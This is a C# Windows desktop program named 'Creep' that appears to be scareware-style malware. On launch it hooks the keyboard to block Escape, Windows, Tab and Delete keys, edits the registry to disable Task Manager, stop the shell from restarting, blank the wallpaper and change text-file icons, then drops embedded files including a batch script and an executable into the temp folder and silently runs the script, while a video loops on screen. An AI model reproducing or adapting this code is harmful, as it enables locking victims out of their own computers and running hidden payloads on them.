using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Forms;
using Utilities;

namespace Creep
{

    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        GlobalKeyboardHook gkh;

        public MainWindow()
        {
            Console.WriteLine("beginning!");

            gkh = new GlobalKeyboardHook();
            gkh.HookedKeys.Add(Keys.Escape);
            gkh.HookedKeys.Add(Keys.LWin);
            gkh.HookedKeys.Add(Keys.RWin);
            gkh.HookedKeys.Add(Keys.Tab);
            gkh.HookedKeys.Add(Keys.Delete);

            gkh.KeyDown += new KeyEventHandler(handleKey);
            gkh.hook();

            WorkWorkWorkWork();

            InitializeComponent();
        }

        private void handleKey(object sender, KeyEventArgs e)
        {
            e.Handled = true;
        }

        private void main_PreviewKeyDown(object sender, System.Windows.Input.KeyEventArgs e)
        {
            e.Handled = true;
        }

        public void WorkWorkWorkWork()
        {
            string temp = System.IO.Path.GetTempPath();
            System.IO.File.WriteAllBytes(temp + "icon.ico", Properties.Resources.texticon);

            RegistryKey editKey;
            
            editKey = Registry.ClassesRoot.CreateSubKey(@"txtfile\DefaultIcon");
            editKey.SetValue("", temp + "icon.ico");
            editKey.Close();

            editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop");
            editKey.SetValue("Wallpaper", "");
            editKey.Close();

            editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            editKey.SetValue("DisableTaskMgr", "1");
            editKey.Close();

            editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
            editKey.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
            editKey.Close();

            System.IO.File.WriteAllBytes(temp + "text.txt", Properties.Resources.txt);
            System.IO.File.WriteAllBytes(temp + "windl.bat", Properties.Resources.windl);
            System.IO.File.WriteAllBytes(temp + "one.rtf", Properties.Resources.one);
            System.IO.File.WriteAllBytes(temp + "rniw.exe", Properties.Resources.subox);

            ProcessStartInfo psi = new ProcessStartInfo(temp + "windl.bat");
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }

        private void MediaElement_MediaEnded(object sender, RoutedEventArgs e)
        {
            MediaElement i = sender as MediaElement;
            i.Position = TimeSpan.FromMilliseconds(1);
        }

        private void video_Loaded(object sender, RoutedEventArgs e)
        {
            string videopath = System.IO.Path.GetTempPath() + "v.mp4";
            System.IO.File.WriteAllBytes(videopath, Properties.Resources.street);

            video.Source = new Uri(videopath);
        }
    }
}
